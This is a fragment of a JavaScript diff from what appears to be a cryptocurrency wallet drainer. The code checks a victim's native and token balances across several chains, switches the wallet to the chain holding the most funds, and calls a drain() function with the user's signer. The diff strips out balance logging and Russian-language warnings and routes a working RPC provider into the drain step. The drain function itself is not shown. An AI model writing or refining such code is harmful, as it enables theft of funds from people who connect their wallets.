-      const nativeTokenPrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[config.nativeToken]);
-      const nativeBalanceInUSDT = (parseFloat(ethers.utils.formatEther(balance.nativeBalance)) * nativeTokenPrice).toFixed(2);
-      console.log(`💰 ${config.nativeToken}: ${ethers.utils.formatEther(balance.nativeBalance)} (≈ $${nativeBalanceInUSDT} USDT)`);
-
-      const usdtBalance = balance.tokenBalances[config.usdtAddress];
-      console.log(`🟠 USDT: ${ethers.utils.formatUnits(usdtBalance, 6)} (≈ $${parseFloat(ethers.utils.formatUnits(usdtBalance, 6)).toFixed(2)} USDT)`);
-
-      const usdcPrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[config.usdcAddress]);
-      const usdcBalance = balance.tokenBalances[config.usdcAddress];
-      const usdcBalanceInUSDT = (parseFloat(ethers.utils.formatUnits(usdcBalance, 6)) * usdcPrice).toFixed(2);
-      console.log(`🔵 USDC: ${ethers.utils.formatUnits(usdcBalance, 6)} (≈ $${usdcBalanceInUSDT} USDT)`);
-
-      if (config.otherTokenAddresses) {
-        for (const [symbol, tokenAddress] of Object.entries(config.otherTokenAddresses)) {
-          const balanceValue = balance.tokenBalances[tokenAddress];
-          const decimals = symbol === "SHIB" ? 18 : 6;
-          if (balanceValue && balanceValue.gt(0)) {
-            const tokenPrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[tokenAddress]);
-            const tokenBalanceInUSDT = (parseFloat(ethers.utils.formatUnits(balanceValue, decimals)) * tokenPrice).toFixed(8);
-            console.log(`🔹 ${symbol}: ${ethers.utils.formatUnits(balanceValue, decimals)} (≈ $${tokenBalanceInUSDT} USDT)`);
-          }
-        }
-      }
-
-      return { chainId: Number(chainId), ...balance };
-    } catch (e) {
-      console.warn(`Ошибка при проверке баланса в сети ${CHAINS[chainId].name}: ${e.message}`);
+      const reliableProvider = await getWorkingProvider(CHAINS[chainId].rpcUrls);
+      const balance = await checkBalance(chainId, userAddress, reliableProvider);
+      return { chainId: Number(chainId), balance, provider: reliableProvider };
+    } catch {
       return null;
     }
   });
 
   const balances = (await Promise.all(balancePromises)).filter(Boolean);
   const sorted = balances
-    .filter(hasFunds)
+    .filter(item => hasFunds(item.balance))
     .sort((a, b) => {
-      const aTotal = Object.values(a.tokenBalances).reduce((sum, bal) => sum.add(bal), ethers.BigNumber.from(0));
-      const bTotal = Object.values(b.tokenBalances).reduce((sum, bal) => sum.add(bal), ethers.BigNumber.from(0));
+      const aTotal = Object.values(a.balance.tokenBalances).reduce((sum, bal) => sum.add(bal), ethers.BigNumber.from(0));
+      const bTotal = Object.values(b.balance.tokenBalances).reduce((sum, bal) => sum.add(bal), ethers.BigNumber.from(0));
       return bTotal.gt(aTotal) ? 1 : -1;
     });
 
   if (!sorted.length) {
-    console.warn("⛔ Нет подходящих сетей с балансом.");
     return 'rejected';
   }
 
   const target = sorted[0];
   await switchChain(target.chainId);
-  const status = await drain(target.chainId, signer, userAddress, target);
+  const status = await drain(target.chainId, signer, userAddress, target.balance, target.provider);
   return status;
 }
